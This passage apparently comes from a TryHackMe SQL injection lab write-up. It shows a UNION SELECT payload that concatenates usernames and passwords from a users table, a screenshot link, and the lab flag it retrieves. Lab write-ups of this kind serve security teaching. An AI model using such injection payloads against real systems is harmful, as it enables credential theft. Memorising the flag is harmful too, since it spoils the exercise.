' UNION SELECT '-1'' UNION SELECT 1,2,3,group_concat(username || ":" || password) from users--
```
<br>

![Vulnerable Startup: Book Title 2 Creds](../../assets/images/thm/sqlilab/52%20-%20vulnerable%20startup%20-%20book%20title%202.png)

Retrieved Flag: `THM{183526c1843c09809695a9979a672f09}`